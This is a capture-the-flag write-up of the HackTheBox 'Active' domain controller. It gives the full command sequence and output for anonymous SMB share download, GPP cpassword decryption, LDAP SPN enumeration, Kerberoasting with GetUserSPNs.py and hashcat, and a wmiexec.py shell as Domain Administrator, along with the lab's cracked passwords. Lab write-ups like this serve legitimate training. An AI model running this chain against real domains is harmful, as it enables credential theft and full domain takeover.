
## Overview

**Platform:** HackTheBox **Operating System:** Windows Server 2008 R2 SP1 (Active Directory) **Difficulty:** Easy **Initial Access:** Anonymous SMB access to a `Replication` share (SYSVOL replica) → `Groups.xml` contains a GPP-encrypted (`cpassword`) credential → `gpp-decrypt` recovers plaintext → authenticated SMB access as `SVC_TGS` **Privilege Escalation:** Authenticated LDAP enumeration reveals the `Administrator` account has an SPN → Kerberoasting (`GetUserSPNs.py`) extracts a TGS hash → hashcat cracks it → `wmiexec.py` as Domain Administrator **Final Access:** Domain Administrator

### Key Techniques

- masscan + nmap two-phase port sweep
- AD environment recognition from port spread
- Anonymous SMB enumeration (`smbclient`, `smbmap`)
- Recursive SMB share download (`RECURSE ON`, `PROMPT OFF`, `mget *`)
- Group Policy Preferences (GPP) `cpassword` credential extraction from `Groups.xml`
- `gpp-decrypt` for GPP password decryption
- Authenticated LDAP queries for active users and SPN enumeration
- `GetADUsers.py` (Impacket) for domain user enumeration
- `GetUserSPNs.py` (Impacket) for SPN discovery and TGS hash extraction (Kerberoasting)
- `hashcat -m 13100` for Kerberos TGS hash cracking
- `wmiexec.py` (Impacket) for shell as Domain Administrator

---

# Attack Path

```text
masscan + nmap
        ↓
AD Port Signature (53, 88, 389, 445 ...) — Domain: active.htb
        ↓
SMB Anonymous Login — List Shares
        ↓
smbmap: Only 'Replication' Readable Anonymously
        ↓
smbclient — RECURSE ON / mget * — Download Entire Share
        ↓
Groups.xml Found — Contains SVC_TGS cpassword (GPP-encrypted)
        ↓
gpp-decrypt — Recover Plaintext: GPPstillStandingStrong2k18
        ↓
Authenticated smbmap — SYSVOL, Users Shares Now Readable
        ↓
Read user.txt via SMB (SVC_TGS Desktop)
        ↓
ldapsearch — Enumerate Active Users (Filter Disabled Accounts)
        ↓
ldapsearch — Filter on serviceprincipalname — Administrator Has SPN
        ↓
GetUserSPNs.py -request — Extract TGS Hash for Administrator
        ↓
hashcat -m 13100 — Crack Hash — Ticketmaster1968
        ↓
wmiexec.py as active\administrator
        ↓
root.txt
```

---

# 1. Nmap Enumeration

Two-phase approach — masscan for speed, then targeted nmap for detail:

```bash
sudo masscan -p1-65535 <target> --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports <target>
```

```text
53/tcp    domain       Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap         Domain: active.htb
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   tcpwrapped
3268/tcp  ldap         Global Catalog
3269/tcp  tcpwrapped
5722/tcp  msrpc
9389/tcp  mc-nmf       .NET Message Framing
47001/tcp http         HTTPAPI 2.0
49152+ dynamic msrpc
```

Classic AD domain controller port signature. Nmap also flags: **SMB message signing enabled and required** — this blocks NTLM relay attacks on this specific box. The DNS banner fingerprints the exact OS build directly.

```bash
echo "<target_ip> active.htb" | sudo tee -a /etc/hosts
```

> [!tip] Recognition Pattern The masscan → nmap two-phase approach is worth keeping alongside a straight `nmap -p-`. masscan is significantly faster for port discovery on ranges with many filtered ports (common on HTB), while nmap handles service detection and scripting. The pipe chain converts masscan's output format into a comma-separated port list suitable for nmap's `-p` argument.

---

# 2. SMB Enumeration (Anonymous)

```bash
smbclient -L //active.htb
# (blank password = anonymous)
```

```bash
smbmap -H <target>
```

```text
ADMIN$      NO ACCESS
C$          NO ACCESS
IPC$        NO ACCESS
NETLOGON    NO ACCESS
Replication READ ONLY      ← only share accessible anonymously
SYSVOL      NO ACCESS
Users       NO ACCESS
```

**`Replication`** is readable with no credentials — and upon connecting, it appears to be a **replica of the SYSVOL share**. SYSVOL is the AD-wide share that stores Group Policies and is normally readable only by authenticated domain users. Having it accessible anonymously is itself a significant misconfiguration.

> [!warning] SYSVOL Replicas Accessible Anonymously = Immediate GPP Check SYSVOL stores Group Policy objects, which can contain Group Policy Preferences (GPP) — including, historically, encrypted passwords in `Groups.xml`. Any anonymous or low-privileged access to SYSVOL or a SYSVOL replica should immediately trigger a recursive download and search for GPP XML files. This is considered one of the most well-known AD misconfigurations.

## Downloading the share recursively

```bash
smbclient //active.htb/Replication
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```

> [!tip] Key Principle `RECURSE ON` + `PROMPT OFF` + `mget *` is the standard smbclient idiom for a full recursive share download. Faster alternatives when dealing with large shares: `smbget -R smb://<target>/share` or mounting with `mount -t cifs`.

---

# 3. Foothold — GPP `cpassword` Decryption

Within the downloaded content, at:

```
active.htb/Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<User ... name="active.htb\SVC_TGS" ...>
  <Properties ...
    cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
    userName="active.htb\SVC_TGS"/>
</User>
```

## What GPP cpassword is

Group Policy Preferences (introduced in Windows Server 2008) allowed admins to push local account configuration — including passwords — via Group Policy. Passwords were AES-256 encrypted and stored in `Groups.xml`. In 2012, **Microsoft published the static 32-byte AES decryption key publicly on MSDN**, rendering every GPP-stored password trivially recoverable by anyone who reads that key. Microsoft patched this in MS14-025 (2014), but legacy environments and old SYSVOL backups still surface this routinely.

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```text
GPPstillStandingStrong2k18
```

Credential recovered: `SVC_TGS : GPPstillStandingStrong2k18`

> [!tip] Key Principle GPP `cpassword` is "low-hanging fruit" because the decryption key is publicly known and the recovery tool is a single command on Kali. GPP credential fields appear in `Groups.xml`, `ScheduledTasks.xml`, `Services.xml`, `DataSources.xml`, and `Printers.xml` — any of these under a `Policies/` directory in SYSVOL are worth checking. The `cpassword` attribute name is consistent across all of them.

## Retrieving the user flag with the new credential

```bash
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H <target>
```

```text
NETLOGON    READ ONLY
Replication READ ONLY
SYSVOL      READ ONLY
Users       READ ONLY   ← now accessible
```

```bash
smbclient -U 'SVC_TGS%GPPstillStandingStrong2k18' //active.htb/Users
smb: \> get SVC_TGS\Desktop\user.txt
```

---

# 4. Privilege Escalation — Kerberoasting

## Authenticated LDAP enumeration

### Finding active (non-disabled) users

```bash
ldapsearch -x -H 'ldap://<target>' \
  -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
  -b "dc=active,dc=htb" -s sub \
  "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" \
  samaccountname | grep sAMAccountName
```

LDAP filter breakdown:

- `objectCategory=person` + `objectClass=user` — user objects only
- `!(useraccountcontrol:1.2.840.113556.1.4.803:=2)` — exclude disabled accounts (UAC bit 2 = account disabled flag)

Returns: `Administrator` and `SVC_TGS` as active accounts. Or using Impacket directly:

```bash
GetADUsers.py -all active.htb/svc_tgs -dc-ip <target>
# Password: GPPstillStandingStrong2k18
```

### Finding accounts with SPNs (Kerberoastable accounts)

```bash
ldapsearch -x -H 'ldap://<target>' \
  -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
  -b "dc=active,dc=htb" -s sub \
  "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" \
  serviceprincipalname | grep -B 1 servicePrincipalName
```

Adding `(serviceprincipalname=*/*)` to the filter restricts results to accounts with at least one SPN registered — these are the Kerberoastable targets.

Result: **`active\Administrator`** — `SPN: active/CIFS:445`

Or via Impacket (cleaner output, same result):

```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip <target>
```

> [!warning] Administrator Account With an SPN = Extremely High Value Kerberoast Target Finding an SPN on the DA account itself compresses the entire privilege escalation to a single hash crack — no lateral movement through a service account first. In most real environments, SPNs live on dedicated service accounts; having one on Administrator makes this a particularly clean, direct chain.

## What Kerberoasting is

When a domain user requests access to a service, the KDC issues a **Ticket Granting Service (TGS)** ticket encrypted with the **NTLM hash of the account running that service**. The requestor receives this ciphertext and can take it offline for cracking — with no further interaction with the target or the service.

Key properties:

- Any authenticated domain user can request a TGS for any SPN — no special privileges needed
- Entirely offline after the initial request — the target service is never contacted again
- Managed Service Accounts (MSAs/gMSAs) mitigate it with long, auto-rotated passwords; human-managed service accounts often use crackable passwords

## Extracting the TGS hash

```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip <target> -request
# Password: GPPstillStandingStrong2k18
```

Returns a `$krb5tgs$23$*Administrator$ACTIVE.HTB$...` hash.

## Cracking with hashcat

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

`-m 13100` = Kerberos 5 TGS-REP etype 23 (RC4-HMAC, the most common and crackable Kerberoast hash type).

```text
...<hash>...:Ticketmaster1968
```

## Shell as Domain Administrator

```bash
wmiexec.py active.htb/administrator:Ticketmaster1968@<target>
```

```
C:\> whoami
active\administrator
C:\> type C:\Users\Administrator\Desktop\root.txt
```

> [!tip] Key Principle `wmiexec.py` delivers a semi-interactive shell via WMI/DCOM — it doesn't require WinRM (5985) or RDP (3389) to be open, executes commands over SMB without dropping a persistent service binary on disk, and uses standard Windows authentication. Worth keeping alongside `psexec.py` (noisier, drops a service) and `smbexec.py` in the Impacket toolkit inventory — each has different requirements and detection characteristics.

---

# Impacket Tools Reference (Used in This Box)

|Tool|Purpose|
|---|---|
|`GetADUsers.py`|Enumerates domain user accounts (PasswordLastSet, LastLogon, etc.)|
|`GetUserSPNs.py`|Discovers Kerberoastable accounts; with `-request`, extracts TGS hashes|
|`wmiexec.py`|Semi-interactive shell via WMI/DCOM using plaintext credentials or hash|

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Nmap: DNS + Kerberos + LDAP together|Active Directory — set up `/etc/hosts`, immediately check SMB for anonymous access|
|Anonymous-readable SMB share resembling SYSVOL|Recursive download → search for `Groups.xml`, `ScheduledTasks.xml`, `Services.xml` for `cpassword` attributes|
|`cpassword` attribute in a GPP XML file|`gpp-decrypt <value>` — one command, public key, instant result|
|Authenticated LDAP access now available|Add `(serviceprincipalname=*/*)` filter to user enumeration to find Kerberoastable accounts|
|Account (especially privileged) has an SPN|`GetUserSPNs.py -request` → `hashcat -m 13100`|
|TGS hash obtained|`hashcat -m 13100` + rockyou.txt — human-managed service accounts often use crackable passwords|
|Domain Admin plaintext password obtained|`wmiexec.py` or `psexec.py` for a shell regardless of WinRM/RDP availability|

---

# Key Lessons

> [!tip] GPP cpassword Is a Reflex Check for Any SYSVOL Access Whenever SYSVOL or a replica is readable (anonymously or authenticated), searching recursively for `cpassword` attributes in GPP XML files is automatic — `gpp-decrypt` makes it a single-command recovery once the file is found.

> [!tip] The Kerberoasting Attack Surface Is Defined by SPNs Any authenticated domain user can Kerberoast any account with a registered SPN — no special privilege required. Extending an LDAP user query with `(serviceprincipalname=*/*)` is a standard post-foothold step in any AD engagement.

> [!tip] An SPN on the Administrator Account Is an Immediate DA Path Finding the DA account itself registered as a Kerberoastable target removes any lateral movement step — a single hash crack yields full domain control. Always check whether SPNs are registered on high-privilege accounts specifically.

> [!tip] `hashcat -m 13100` Is the Module for Kerberos TGS Hashes The `$krb5tgs$23$*` format output by `GetUserSPNs.py -request` maps to hashcat mode 13100 (Kerberos 5 TGS-REP etype 23). Worth having this memorized alongside the other common AD hash modes (1000 = NTLM, 18200 = AS-REP / ASREPRoasting).